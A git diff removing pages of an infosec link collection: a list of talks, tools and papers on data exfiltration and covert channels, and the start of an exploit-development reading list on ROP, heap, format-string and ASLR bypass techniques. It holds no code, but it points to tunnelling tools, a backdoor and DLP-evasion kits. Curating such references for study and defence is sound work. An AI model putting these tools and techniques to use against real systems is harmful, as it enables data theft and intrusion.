-	* Covert channels are used for the secret transfer of information. Encryption only protects communication from being decoded by unauthorised parties, whereas covert channels aim to hide the very existence of the communication. Initially, covert channels were identified as a security threat on monolithic systems i.e. mainframes. More recently focus has shifted towards covert channels in computer network protocols. The huge amount of data and vast number of different protocols in the Internet seems ideal as a high-bandwidth vehicle for covert communication. This article is a survey of the existing techniques for creating covert channels in widely deployed network and application protocols. We also give an overview of common methods for their detection, elimination, and capacity limitation, required to improve security in future computer networks. 
-* [Covert Timing Channels Based on HTTP Cache Headers - Video Presentation](https://www.youtube.com/watch?v=DOAG3mtz7H4)
-	* [Covert Timing Channels Based on HTTP Cache Headers - Paper](https://scholarworks.rit.edu/cgi/viewcontent.cgi?filename=0&article=1784&context=other&type=additional)
-
-
-
------
-### <a name="talks"></a>Talks & Presentations
-* [Boston BSides - Simple Data Exfiltration in a Secure Industry Environment - Phil Cronin](https://www.youtube.com/watch?v=IofUpzYZNko)
-	* This presentaion explores the top 10 data exfiltration methods that can be accomplished with only ?user-level? privileges and that are routinely overlooked in security-conscious industries.
-* [Emanate Like A Boss: Generalized Covert Data Exfiltration With Funtenna](https://www.youtube.com/watch?v=-YXkgN2-JD4)
-	* Funtenna is a software-only technique which causes intentional compromising emanation in a wide spectrum of modern computing hardware for the purpose of covert, reliable data exfiltration through secured and air-gapped networks. We present a generalized Funtenna technique that reliably encodes and emanates arbitrary data across wide portions of the electromagnetic spectrum, ranging from the sub-acoustic to RF and beyond. The Funtenna technique is hardware agnostic, can operate within nearly all modern computer systems and embedded devices, and is specifically intended to operate within hardware not designed to to act as RF transmitters. We believe that Funtenna is an advancement of current state-of-the-art covert wireless exfiltration technologies. Specifically, Funtenna offers comparable exfiltration capabilities to RF-based retro-reflectors, but can be realized without the need for physical implantation and illumination. We first present a brief survey of the history of compromising emanation research, followed by a discussion of the theoretical mechanisms of Funtenna and intentionally induced compromising emanation in general. Lastly, we demonstrate implementations of Funtenna as small software implants within several ubiquitous embedded devices, such as VoIP phones and printers, and in common computer peripherals, such as hard disks, console ports, network interface cards and more.
-* [Data Exfiltration: Secret Chat Application Using Wi-Fi Covert Channel by Yago Hansen at the BSidesMunich 2017](https://www.youtube.com/watch?v=-cSu63s4zPY)
-* [Itzik Kotler | Goodbye Data, Hello Exfiltration - BSides Orlando](https://www.youtube.com/watch?v=GwaIvm2HJKc)
-	* Penetration testing isn?t about getting in, it?s also about getting out with the goodies. In this talk, you will learn how leverage commonly installed software (not Kali Linux!) to exfiltrate data from networks. Moving on to more advanced methods that combines encryption, obfuscation, splitting (and Python). Last but not least, I?ll address data exfiltration via physical ports and demo one out-of-the-box method to do it.
-* [In Plain Sight: The Perfect Exfiltration Technique - Itzik Kotler and Amit Klein - HiTB2016](https://www.youtube.com/watch?v=T6PscV43C0w)
-	* In this session, we will reveal and demonstrate perfect exfiltration via indirect covert channels (i.e. the communicating parties don?t directly exchange network packets). This is a family of techniques to exfiltrate data (low throughput) from an enterprise in a manner indistinguishable from genuine traffic. Using HTTP and exploiting a byproduct of how some websites choose to cache their pages, we will demonstrate how data can be leaked without raising any suspicion. These techniques are designed to overcome even perfect knowledge and analysis of the enterprise network traffic.
-* [Can You Hear Me Now?!? Thoery of SIGTRAN Stego. BSidesPHX 2012](https://www.youtube.com/watch?v=vzpzL-UlpdA)
-	* Ever wanted to know how to communicate with someone and not be heard? As many know, the internal cellular network uses SS7 and SIGTRAN to communicate via out-of-band signalling. What many don't know is what can be done with this. CC-MSOBS (Covert Channel via Multi-Streaming Out of Band Signalling) is a new form of covert communication which can be utilized by taking advantage of the multi-streaming aspects of SCTP and the using it with the out-of-band signalling capabilities of SIGTRAN. Come explore this developing covert channel as Drew Porter covers not only his idea but also his current research on this new covert channel. 
-* [Ma?gne?tic Side- and Co?vert-Chan?nels using Smart?pho?ne Ma?gne?tic Sen?sors](https://www.youtube.com/watch?v=-LZJqRXZ2OM)
-	* Side- and co?vert-chan?nels are un?in?ten?tio?nal com?mu?ni?ca?ti?on chan?nels that can leak in?for?ma?ti?on about ope?ra?ti?ons being per?for?med on a com?pu?ter, or serve as means of secre?te com?mi?na?ti?on bet?ween at?ta?ckers, re?spec?tive?ly. This pre?sen?ta?ti?on will di?s?cuss re?cent, new side- and co?vert-chan?nels uti?li?zing smart?pho?ne ma?gne?tic sen?sors. In par?ti?cu?lar, our work on these chan?nels has shown that sen?sors outside of a com?pu?ter hard drive can pick up the ma?gne?tic fields due to the mo?ving hard disk head. With these me?a?su?re?ments, we are able to de?du?ce pat?terns about on?go?ing ope?ra?ti?ons, such as de?tect what type of the ope?ra?ting sys?tem is boo?ting up or what ap?p?li?ca?ti?on is being star?ted. Mo?re?over, by in?du?cing elec?tro?ma?gne?tic si?gnals from a com?pu?ter in a con?trol?led way, at?ta?ckers can mo?du?la?te and trans?mit ar?bi?tra?ry bi?na?ry data over the air. We show that mo?dern smart?pho?nes are able to de?tect dis?tur?ban?ces in the ma?gne?tic field at a dis?tan?ce of dozen or more cm from the com?pu?ter, and can act as re?cei?vers of the trans?mit?ted in?for?ma?ti?on. Our me?thods do not re?qui?re any ad?di?tio?nal equip?ment, firm?ware mo?di?fi?ca?ti?ons or pri?vi?le?ged ac?cess on eit?her the com?pu?ter (sen?der) or the smart?pho?ne (re?cei?ver). Based on the thre?ats, po?ten?ti?al coun?ter-me?a?su?res will be pre?sen?ted that can miti?ga?te some of the chan?nels.
-* [[DS15] Bridging the Air Gap Data Exfiltration from Air Gap Networks - Mordechai Guri & Yisroel Mirsky](https://www.youtube.com/watch?v=bThJEX4l_Ks)
-	* Air-gapped networks are isolated, separated both logically and physically from public networks. Although the feasibility of invading such systems has been demonstrated in recent years, exfiltration of data from air-gapped networks is still a challenging task. In this talk we present GSMem, a malware that can exfiltrate data through an air-gap over cellular frequencies. Rogue software on an infected target computer modulates and transmits electromagnetic signals at cellular frequencies by invoking specific memory-related instructions and utilizing the multichannel memory architecture to amplify the transmission. Furthermore, we show that the transmitted signals can be received and demodulated by a rootkit placed in the baseband firmware of a nearby cellular phone. We present crucial design issues such as signal generation and reception, data modulation, and transmission detection. We implement a prototype of GSMem consisting of a transmitter and a receiver and evaluate its performance and limitations. Our current results demonstrate its efficacy and feasibility, achieving an effective transmission distance of 1-5.5 meters with a standard mobile phone. When using a dedicated, yet affordable hardware receiver, the effective distance reached over 30 meters.
-* [Inter VM Data Exfiltration: The Art of Cache Timing Covert Channel on x86 Multi-Core - Etienne Martineau](https://www.youtube.com/watch?v=SGqUGHh3UZM)
-	* On x86 multi-core covert channels between co-located Virtual Machine (VM) are real and practical thanks to the architecture that has many imperfections in the way shared resources are isolated. This talk will demonstrate how a non-privileged application from one VM can ex-filtrate data or even establish a reverse shell into a co-located VM using a cache timing covert channel that is totally hidden from the standard access control mechanisms while being able to offer surprisingly high bps at a low error rate. In this talk you?ll learn about the various concepts, techniques and challenges involve in the design of a cache timing covert channel on x86 multi-core such as: X86 shared resources and fundamental concept behind cache line encoding / decoding. Getting around the hardware pre-fetching logic ( without disabling it from the BIOS! ) Abusing the X86 ?clflush? instruction. Bi-directional handshake for free! Data persistency and noise. What can be done? Guest to host page table de-obfuscation. The easy way, the VM?s vendors defense and another way to get around it. Phase Lock Loop and high precision inter-VM synchronization. All about timers. At the end of this talk we will go over a working VM to VM reverse shell example as well as some surprising bandwidth measurement results. We will also cover the detection aspect and the potential countermeasure to defeat such a communication channel.
-* [Bridging the Air Gap Data Exfiltration from Air Gap Networks - DS15](https://www.youtube.com/watch?v=bThJEX4l_Ks)
-* [Covert Timing Channels Based on HTTP Cache Headers](https://www.youtube.com/watch?v=DOAG3mtz7H4)
-* [In Plain Sight: The Perfect Exfiltration Technique - Itzik Kotler and Amit Klein - HITB16](https://www.youtube.com/watch?v=T6PscV43C0w)
-
-
-
------
-### <a name="writeups"></a>Writeups
-* [Data Exfiltration (Tunneling) Attacks against Corporate Network](https://pentest.blog/data-exfiltration-tunneling-attacks-against-corporate-network/)
-
-
-
-
-
------
-### <a name="tools">Tools</a>
-* [iodine](https://github.com/yarrick/iodine)
-	* This is a piece of software that lets you tunnel IPv4 data through a DNS server. This can be usable in different situations where internet access is firewalled, but DNS queries are allowed.
-* [dnscat2](https://github.com/iagox86/dnscat2)
-	* Welcome to dnscat2, a DNS tunnel that WON'T make you sick and kill you!  This tool is designed to create a command-and-control (C&C) channel over the DNS protocol, which is an effective tunnel out of almost every network.
-* [fraud-bridge](https://github.com/stealth/fraud-bridge) 
-	* fraud-bridge allows to tunnel TCP connections through ICMP, ICMPv6, DNS via UDP or DNS via UDP6. Project, not stable
-* [PyExfil](https://ytisf.github.io/PyExfil/)
-	* Exfiltration tools inspired by Regin. Alpha Status.
-* [Exfil - Modular tool to test exfiltration techniques](https://github.com/averagesecurityguy/exfil)
-	* Exfil is a tool designed to exfiltrate data using various techniques, which allows a security team to test whether its monitoring system can effectively catch the exfiltration. The idea for Exfil came from a Twitter conversation between @averagesecguy, @ChrisJohnRiley, and @Ben0xA and was sparked by the TrustWave POS malware whitepaper available at https://gsr.trustwave.com/topics/placeholder-topic/point-of-sale-malware/.
-* [Multitun](https://github.com/covertcodes/multitun) 
-	* Efficiently and securely tunnel everything over a harmless looking WebSocket!
-* [Data Exfiltration Toolkit(DET)](https://github.com/sensepost/det)
-	* DET (is provided AS IS), is a proof of concept to perform Data Exfiltration using either single or multiple channel(s) at the same time. This is a Proof of Concept aimed at identifying possible DLP failures. This should never be used to exfiltrate sensitive/live data (say on an assessment) The idea was to create a generic toolkit to plug any kind of protocol/service to test implmented Network Monitoring and Data Leakage Prevention (DLP) solutions configuration, against different data exfiltration techniques.
-* [canisrufus](https://github.com/maldevel/canisrufus)
-	* A stealthy Python based Windows backdoor that uses Github as a command and control server
-* [Stunnel](https://www.stunnel.org/index.html)
-	* [Stunnel TLS Proxy](https://www.stunnel.org/static/stunnel.html)
-* [dnsftp](https://github.com/breenmachine/dnsftp)
-	* Client/Server scripts to transfer files over DNS. Client scripts are small and only use native tools on the host OS.
-* [tcpovericmp](https://github.com/Maksadbek/tcpovericmp)
-	* TCP implementation over ICMP protocol to bypass firewalls
-* [icmptunnel](https://github.com/DhavalKapil/icmptunnel)
-	* Transparently tunnel your IP traffic through ICMP echo and reply packets.
-* [Outgoing port tester - http://letmeoutofyour.net/](http://letmeoutofyour.net/)
-	* [Outgoing port tester - portquiz.net](http://portquiz.net/)
-	*  This server listens on all TCP ports, allowing you to test any outbound TCP port.
-* [CloakifyFactory](https://github.com/TryCatchHCF/Cloakify)
-	* CloakifyFactory & the Cloakify Toolset - Data Exfiltration & Infiltration In Plain Sight; Evade DLP/MLS Devices; Social Engineering of Analysts; Defeat Data Whitelisting Controls; Evade AV Detection. Text-based steganography usings lists. Convert any file type (e.g. executables, Office, Zip, images) into a list of everyday strings. Very simple tools, powerful concept, limited only by your imagination.
-
-
-
-
-
-
-
-
-
-
------
-### <a name="papers"></a>Papers
-* [Self-Exfiltration: The Dangers of Browser-Enforced Information Flow Control](http://ericchen.me/self_exfiltration.pdf)
-	* Abstract ?Since the early days of Netscape, browser vendors and web security researchers have restricted out-going data based on its destination. The security argument accompanying these mechanisms is that they prevent sensitive user data from being sent to the attacker?s domain. However, in this paper, we show that regulating web information flow based on its destination server is an inherently flawed security practice. It is vulnerable to self-exfiltration attacks, where an adversary stashes stolen information in the database of a whitelisted site, then later independently connects to the whitelisted site to retrieve the information. We describe eight existing browser security mechanisms that are vulnerable to these ?self-exfiltration? attacks. Furthermore, we discovered at least one exfiltration channel for each of the Alexa top 100 websites. None of the existing information flow control mechanisms we surveyed are sufficient to protect data from being leaked to the attacker. Our goal is to prevent browser vendors and researchers from falling into this trap by designing more systems that are vulnerable to self-exfiltration.
-
diff --git a/Draft/Exploit Development.md b/Draft/Exploit Development.md
deleted file mode 100755
index 0fb11a1..0000000
--- a/Draft/Exploit Development.md	
+++ /dev/null
@@ -1,1204 +0,0 @@
-# Exploit Development
-
-TOC
-Sort
-
-Talks 
-
-* [General Stuff/Techniques](#general)
-* [General Stuff I can't figure where else to put](#eh)
-* [Acquiring Old/Vulnerable Software](#acquire)
-* [Practice Exploit Dev/Structured Learning](#practice)
-* [Exploit Dev Papers](#expapers)
-	* [bof](#bof)
-	* [ROP](ROP)
-		* BlindROP
-		* SignalROP
-		* JumpROP
-	* [Heap](#heap)
-	* [Format String](#fs)
-	* [Integer Overflows](into)
-	* [Null Ptr Dereference](#nullptr)
-	* [JIT-Spray](#jit)
-	* [ASLR](#aslr)
-	* [Kernel Exploitation](#kernelex)
-	* [Use After Free](#uaf)
-	* [Other](#other)
-* [writing shellcode](#shellcode)
-	* Windows Specific
-	* Linux specific
-* [Tutorials](#tutorials)
-* [AV Bypass Methods](#avbypass)
-* [Bypassing Exploit Protections/Mitigations](#bypass-ep)
-	* DEP/SEHop/ASLR
-	* CFG/EMET
-	* DeviceGuard
-* [Obfuscation](#obfuscation)
-* [ARM Specific things](#arm)
-* [Linux Specific](#linux)
-* [Windows Specific](#windows)
-* [Bypass SEH/SE-HOP; ](#SEH)
-* [Windows Heap Exploitation](#winheap)
-* [Anti Fuzzing](#antifuzz)
-* [Assembly](#asm)ASLR
-* [Anti Debugging](#antidebug)
-* [General Tools](#generaltools)
-	* General
-	* Hunting/Making Exploits
-	* Shellcode
-* [Decompilers/Disassemblers](#decomp)
-* [Debuggers](#debug)
-	* General
-	* Linux 
-	* Windows
-* [General Papers](#papers)
-* [Miscellaneous Exploit Writeups](#miscex)
-	* Talks
-	* blogposts
-	* Papers
-* [Attacking AV](#attackav)
-* [Finding Vulnerabilities](#finding)
-* [GPU Exploit/Research](#gpu)
-* [Building a lab to Practice Exploit Development](#lab)
-
-
-#### To Do
-* Sort tools better, like enviromental tools vs use-specific tools
-* Corelan Exploit Series
-* Add heap section
-
-
-
-#### Sort:
-[BISC: Borrowed Instructions Synthetic Computation](https://github.com/trailofbits/bisc)
-* BISC is a Ruby library for demonstrating how to build borrowed-instruction programs. BISC aims to be simple, analogous to a traditional assembler, minimize behind-the-scenes magic, and let users write simple macros. BISC was developed by Dino Dai Zovi for Practical Return-oriented Programming at Blackhat USA 2010 and was used for the Assured Exploitation `ng course.
-
-[Offset-DB](http://offset-db.com/)
-*  This website provide you a list of useful offset that you can use for your exploit.
-
-[Example of a DLL Hijack Exploit - Winamp 5.581](https://www.exploit-db.com/exploits/14789/)
-
-[Build a database of libc offsets to simplify exploitation](https://github.com/niklasb/libc-database)
-
-[Return Oriented Programming Tutorial](https://github.com/akayn/demos/blob/master/Tutorials/README.md)
-
-[Loading a DLL from memory](https://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/)
-
-[MS17-010: EternalBlue’s Large Non-Paged Pool Overflow in SRV Driver - blog.trendmicro](http://blog.trendmicro.com/trendlabs-security-intelligence/ms17-010-eternalblue/)
-
-[MS17-010 worawit](https://github.com/worawit/MS17-010)
-
-
-#### End Sort
-
-
-
-
----------------
-### <a name="presentations">Talks & Presentations</a>
-* [Unusual Bugs(23C3)](https://www.youtube.com/watch?v=qj79Qdmw0Pk)
-	* In this presentation I'll present a series of unusual security bugs. Things that I've ran into at some point and went "There's gotta be some security consequence here". None of these are really a secret, and most of them are even documented somewhere. But apparently most people don't seem to know about them.  What you'll see in this presentation is a list of bugs and then some explanation of how these could be exploited somehow. Some of the things I'll be talking about are (recursive) stack overflow, NULL pointer dereferences, regular expressions and more.
-* [Automated vulnerability analysis  of zero sized heap allocations](http://www.hackitoergosum.org/2010/HES2010-jvanegue-Zero-Allocations.pdf)
-* [OptiROP: The art of hunting ROP gadgets](https://media.blackhat.com/us-13/US-13-Quynh-OptiROP-Hunting-for-ROP-Gadgets-in-Style-WP.pdf)
-	* [Video](https://www.youtube.com/watch?v=_3uBybBpq48)
-	* This research attempts to solve the problem by introducing a tool named OptiROP that lets exploitation writers search for ROP gadgets with semantic queries. Combining sophisticated techniques such as code normalization, code optimization, code slicing, SMT solver and some creative heuristic searching methods, OptiROP is able to discover desired gadgets very quickly, with much less efforts. Our tool also provides the detail semantic meaning of each gadget found, so users can easily decide how to chain their gadgets for the final shellcode.
-* [The Wallstreet of Windows Binaries - Marion Marschalek, Joseph Moti](https://www.youtube.com/watch?v=8zlTv7fRjV8)
-	* [Wallstreet - Github Repository](https://github.com/pinkflawd/Wallstreet)
-	* Wallstreet of Windows binaries 7, 8, 9 err 10 sorry
-* [Slides - Weird - Machine Motivated Practical Page Table Shellcode & Finding Out What's Running on Your System](https://www.defcon.org/images/defcon-22/dc-22-presentations/Macaulay/DEFCON-22-Shane-Macaulay-Weird-Machine-Motivated-Practical-Page-Table-Shellcode-UPDATED.pdf)
-* [Hacking FinSpy - a Case Study - Atilla Marosi - Troopers15](https://www.youtube.com/watch?v=Mb4mfBi06K4)
-* [A brief history of Exploitation - Devin Cook](http://www.irongeek.com/i.php?page=videos/derbycon4/t514-a-brief-history-of-exploitation-devin-cook)
-* [Funky File Formats - Advanced Binary Exploitation](http://media.ccc.de/browse/congress/2014/31c3_-_5930_-_en_-_saal_6_-_201412291400_-_funky_file_formats_-_ange_albertini.html#video)
-* [Compromise-as-a-Service: Our PleAZURE.](https://www.troopers.de/events/troopers14/49_compromise-as-a-service_our_pleazure/)
-	* This could be a comprehensive introduction about the ubiquity of virtualization, the essential role of the hypervisor, and how the security posture of the overall environment depends on it. However, we decided otherwise, as this is what everybody is interested in: We will describe the Hyper-V architecture in detail, provide a taxonomy of hypervisor exploits, and demonstrate how we found MS13-092 which had the potential to compromise the whole Azure environment. Live demo included!
-* [Cisco ASA Episode 3: A Journey In Analysing Heaps by Cedric Halbronn - BSides Manchester2017](https://www.youtube.com/watch?v=ADYdToi6Wn0&index=21&list=PLcgqQkap1lNrOBNCXqpPqpPAqckxv0XhP)
-* [From MS08 067 To EternalBlue by Denis Isakov - BSides Manchester2017](https://www.youtube.com/watch?v=LZ_G6RdqrHA&index=13&list=PLcgqQkap1lNrOBNCXqpPqpPAqckxv0XhP)
-* [MSRC-Security-Research Github](https://github.com/Microsoft/MSRC-Security-Research/tree/master/presentations)
-
-
-
-
-
--------------
-### <a name="general">General Stuff /Techniques/Tricks</a>
-* [Exploit Mitigation Killchain](http://0xdabbad00.com/wp-content/uploads/2013/04/exploit_mitigation_kill_chain.pdf)
-* [Mechanization of Exploits](https://github.com/REMath/literature_review/blob/master/mechanization_of_exploits.org)
-* [Exploit Tips and Techniques(ReCon2014 William Peteroy)](https://www.youtube.com/watch?v=FEXnJKXYoLM)
-* [Differential Slicing: Identifying Causal Execution Differences for Security Applications](http://bitblaze.cs.berkeley.edu/papers/diffslicing_oakland11.pdf)
-* [Art of Picking Intel Registers](http://www.swansontec.com/sregisters.html)
-* [Trampolines in x64](http://www.ragestorm.net/blogs/?p=107)
-* [Playing with canaries](https://www.elttam.com.au/blog/playing-with-canaries/)
-
-
-
-
-
-
----------------
-### General Stuff that I can't decide where else to put
-* [Root Cause Analysis – Memory Corruption Vulnerabilities](https://www.corelan.be/index.php/2013/02/26/root-cause-analysis-memory-corruption-vulnerabilities/)
-* [RAP: RIP ROP (GRSEC/PaX team)](https://pax.grsecurity.net/docs/PaXTeam-H2HC15-RAP-RIP-ROP.pdf)
-* [Counterfeit Object-oriented Programming](http://syssec.rub.de/media/emma/veroeffentlichungen/2015/03/28/COOP-Oakland15.pdf)
-* [OneRNG](http://moonbaseotago.com/onerng/theory.html)
-* [Link to Lab Writeup](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Draft/Exploit%20Development/Lab%20for%20Practicing%20Exploit%20Writing.txt)
-
-
-
-
-
-
-
-
-
-
-
----------------
-### <a name="acquire">Acquiring Old/Vulnerable Software</a>
-* [Acquiring VMs of any Windows going back to XP to Windows 10](https://www.modern.ie/en-us/virtualization-tools#downloads)
-* [OldApps.com](http://www.oldapps.com/)
-
-
-
-
-
---------------
-### <a name="practice"></a>Practice Exploit Development / Structured Learning
-* [Exploit-Challenges - A collection of vulnerable ARM binaries for practicing exploit development](https://github.com/Billy-Ellis/Exploit-Challenges)
-	* Here are a collection of vulnerable ARM binaries designed for beginner vulnerability researchers & exploit developers to play around with and test their skills!
-* [BinTut](https://github.com/NoviceLive/bintut)
-	* Dynamic or live demonstration of classical exploitation techniques of typical memory corruption vulnerabilities, from debugging to payload generation and exploitation, for educational purposes
-* [ROP Emporium](https://ropemporium.com/)
-	* Learn return-oriented programming through a series of challenges designed to teach ROP techniques in isolation, with minimal reverse-engineering and bug-hunting.
-* [Pwnables.kr](https://pwnable.kr)
-
-
-
------------------- 
-* Originally from (originally a pastebin link, which had been modified from a persons personal page, i believe it may have been an r2 dev?) If you made this, thank you so much; I've now added onto it and changed it from what it originally was. I've kept the original creator's note as I feel it is highly relevant and aligns with my goal)
-
-* "My intention with this document is for it to be somewhat of a recommended reading list for the aspiring hacker. I have tried to order the articles by technique and chronology. - sar"
-
-### <a name="bof">Buffer overflows:</a>
-* [How to write buffer overflows, mudge, 1995](http://insecure.org/stf/mudge_buffer_overflow_tutorial.html)
-* [Smashing the stack for fun and profit, Aleph One, 1996](http://www.phrack.com/issues.html?issue=49&id=14)
-* [Smashing the Stack for Fun and Profit in 2010](http://www.mgraziano.info/docs/stsi2010.pdf)
-* [The Frame Pointer Overwrite, klog, 1999](http://www.phrack.com/issues.html?issue=55&id=8)
-* [win32 buffer overflows, dark spyrit, 1999](http://www.phrack.com/issues.html?issue=55&id=15)
-* [Understanding Buffer Overflow Exploits](http://proactivedefender.blogspot.com/2013/05/understanding-buffer-overflows.html)
- 
-
-
-
-
-
-
-
-
-
-
------------------- 
-### <a name="rop">Return-into-lib / Return oriented programming:</a>
-* [Getting around non-executable stack (and fix) (First public description of a return-into-libc exploit), Solar Designer, 1997](http://marc.info/?l=bugtraq&m=87602746719512)
-* [More advanced ret-into-lib(c) techniques, Nergal, 2001](http://www.phrack.com/issues.html?issue=58&id=4)
-* [On the effectiveness of address-space randomization, , 2004](http://benpfaff.org/papers/asrandom.pdf)
-* [Introduction to Return Oriented Programming (ROP) - ketansingh.net](https://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/)
-* [Gentle introduction to ROP programming](http://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/)
-* [Borrowed code chunks exploitation technique, Sebastian Krahmer, 2005](http://www.suse.de/~krahmer/no-nx.pdf)
-* [The Geometry of Innocent Flesh on the Bone: Return-into-libc without function calls, Hovav Shacham, 2007](http://cseweb.ucsd.edu/~hovav/dist/geometry.pdf)
-* [Defeating DEP, the Immunity Debugger way, Pablo Sole,2008](http://www.immunitysec.com/downloads/DEPLIB.pdf)
-* [The Case of Return-Oriented Programming and the AVC Advantage, 2009](http://www.usenix.org/event/evtwote09/tech/full_papers/checkoway.pdf)
-* [Practical Return-Oriented Programming, Dino A. Dai Zovi, 2010](http://www.sourceconference.com/bos10pubs/Dino.pdf)
-* [Return-Oriented Programming without Returns](https://www.cs.uic.edu/~s/papers/noret_ccs2010/noret_ccs2010.pdf)
-* [Introduction to ROP programming](http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html)
-
-#### Blind ROP
-* [Blind Return Oriented Programming (BROP)](http://www.scs.stanford.edu/~sorbo/brop/) 
-	* The BROP attack makes it possible to write exploits without possessing the target's binary. It requires a stack overflow and a service that restarts after a crash. Based on whether a service crashes or not (i.e., connection closes or stays open), the BROP attack is able to construct a full remote exploit that leads to a shell. The BROP attack remotely leaks enough gadgets to perform the write system call, after which the binary is transferred from memory to the attacker's socket. Following that, a standard ROP attack can be carried out. Apart from attacking proprietary services, BROP is very useful in targeting open-source software for which the particular binary used is not public (e.g., installed from source setups, Gentoo boxes, etc.). The attack completes within 4,000 requests (within minutes) when tested against a toy proprietary service, and real vulnerabilities in nginx and MySQL. 
-* [Hacking Blind - BROP paper](http://www.scs.stanford.edu/~sorbo/brop/bittau-brop.pdf)
-* [Blind Return Oriented Programming](http://www.scs.stanford.edu/brop/)
-* [Blind Return Oriented Programming (BROP) Attack (1)](http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-yi/)
-* [Blind Return Oriented Programming (BROP) Attack (2)](http://ytliu.info/blog/2014/06/01/blind-return-oriented-programming-brop-attack-er/)
-#### Signal ROP
-* [Sigreturn Oriented Programming is a real Threat](https://subs.emis.de/LNI/Proceedings/Proceedings259/2077.pdf)
-* [Playing with signals : An overview on Sigreturn Oriented Programming](https://thisissecurity.net/2015/01/03/playing-with-signals-an-overview-on-sigreturn-oriented-programming/)
-* [SROP | Signals, you say?](https://0x00sec.org/t/srop-signals-you-say/2890)
-#### Jump Oriented Programming
-* [Jump-Oriented Programming: A New Class of Code-Reusegghunte](https://www.comp.nus.edu.sg/~liangzk/papers/asiaccs11.pdf)
-* [Attacking x86 Windows Binaries by Jump Oriented Programming](http://www.uni-obuda.hu/users/szakala/INES%202013%20pendrive/61_ines2013.pdf)
-
-
-
-
-
-
-
------------------- 
-### <a name="heap">Heap exploitation:</a>
-* [how2heap - shellphish](https://github.com/shellphish/how2heap)
-	* A repository for learning various heap exploitation techniques.
-* [w00w00 on heap overflows, Matt Conover, 1999](http://w00w00.org/files/articles/heaptut.txt)
-* [Vudo - An object superstitiously believed to embody magical powers, Michel "MaXX" Kaempf, 2001](http://www.phrack.com/issues.html?issue=57&id=8)
-* [Once upon a free(), anonymous author, 2001](http://www.phrack.com/issues.html?issue=57&id=9)
-* [Advanced Doug Lea's malloc exploits, jp, 2003](http://www.phrack.com/issues.html?issue=61&id=6) 
-* [Exploiting the wilderness, Phantasmal Phantasmagoria, 2004](http://www.derkeiler.com/Mailing-Lists/securityfocus/vuln-dev/2004-02/0024.html)
-* [Malloc Maleficarum, Phantasmal Phantasmagoria, 2005](http://www.packetstormsecurity.org/papers/attack/MallocMaleficarum.txt)
-* [Yet another free() exploitation technique, huku, 2009](http://www.phrack.com/issues.html?issue=66&id=6)
-* [Heap Feng Shui in JavaScript](https://www.blackhat.com/presentations/bh-usa-07/Sotirov/Whitepaper/bh-usa-07-sotirov-WP.pdf) 
-* [heap-exploitation](https://github.com/DhavalKapil/heap-exploitation)
-	* This book on heap exploitation is a guide to understanding the internals of glibc's heap and various attacks possible on the heap structure.
-* [Project HeapBleed](http://census-labs.com/news/2014/11/27/project-heapbleed/)
-	* CENSUS researcher Patroklos Argyroudis has recently presented a talk on heap exploitation abstraction at two conferences, namely ZeroNights 2014 (Moscow, Russia) and BalCCon 2014 (Novi Sad, Serbia). In the talk titled Project Heapbleed, Patroklos has collected the experience of exploiting allocators in various different target applications and platforms. He focused on practical, reusable heap attack primitives that aim to reduce the exploit development time and effort.
-
-
-
-
------------------- 
-### <a name="format">Format string exploitation:</a>
-* [Exploiting format string vulnerabilities, scut / Team-TESO, 2001](http://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf)
-*[Advances in format string exploitation, gera, 2002](http://www.phrack.com/issues.html?issue=59&id=7)
-* [An alternative method in format string exploitation, K-sPecial, 2006](https://web.archive.org/web/20070513143544/http://www.milw0rm.com/papers/103)
-* [Maximum Overkill Two - From Format String Vulnerability to Remote Code Execution](https://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/)
- * [Exploiting Format Strings: Getting the Shell](http://resources.infosecinstitute.com/exploiting-format-strings-getting-the-shell/)
-
-
-
-
-
-
-
-
------------------- 
-### <a name="into">Integer overflows:</a>
-* [Big Loop Integer Protection, Oded Horovitz, 2002](http://www.phrack.com/issues.html?issue=60&id=9)
-* [Basic Integer Overflows, blexim, 2002](http://www.phrack.com/issues.html?issue=60&id=10)
- 
-
-
-
-
-
-
-
-
-
-
-
-
------------------- 
-### <a name="nullptr">Null-ptr dereference:</a>
-* [Large memory management vulnerabilities, Gael Delalleau, 2005](http://cansecwest.com/core05/memory_vulns_delalleau.pdf)
-* [Exploiting the Otherwise Non-exploitable on Windows, skape, 2006](http://www.uninformed.org/?v=4&a=5&t=pdf)
-* [Vector rewrite attack, Barnaby Jack, 2007](http://www.juniper.net/solutions/literature/white_papers/Vector-Rewrite-Attack.pdf)
-* [Application-Specific Attacks: Leveraging the ActionScript Virtual Machine, Mark Dowd, 2008](http://documents.iss.net/whitepapers/IBM_X-Force_WP_final.pdf)
- 
-
-
-
-
-
-
-
-
-
------------------- 
-### <a name="jit">JIT-spray:</a>
-* [Pointer inference and JIT-Spraying, Dion Blazakis, 2010](http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf)
-* [Writing JIT shellcode for fun and profit, Alexey Sintsov, 2010](http://dsecrg.com/files/pub/pdf/Writing%20JIT-Spray%20Shellcode%20for%20fun%20and%20profit.pdf)
- 
-[INTERPRETER  EXPLOITATION: POINTER INFERENCE AND JIT SPRAYING](http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf)
-
-[Understanding JIT Spray](http://blog.cdleary.com/2011/08/understanding-jit-spray/)
-
-[Writing JIT-Spray Shellcode For Fun And Profit](https://packetstormsecurity.com/files/86975/Writing-JIT-Spray-Shellcode-For-Fun-And-Profit.html)
-
-
-
------------------- 
-### <a name="aslr"> ASLR:</a>
-* [Exploit writing tutorial part 6 : Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR](https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/)
-* [Aslr Smack and Laugh Reference](http://www-users.rwth-aachen.de/Tilo.Mueller/ASLRpaper.pdf)
-* [Advanced Buffer Overflow Methods](http:/www.cs.tau.ac.il/tausec/lectures/Advanced_Buffer_Overflow_Methods.ppt)
-* [Smack the Stack](http://www.sts.synflood.de/dump/doc/smackthestack.txt)
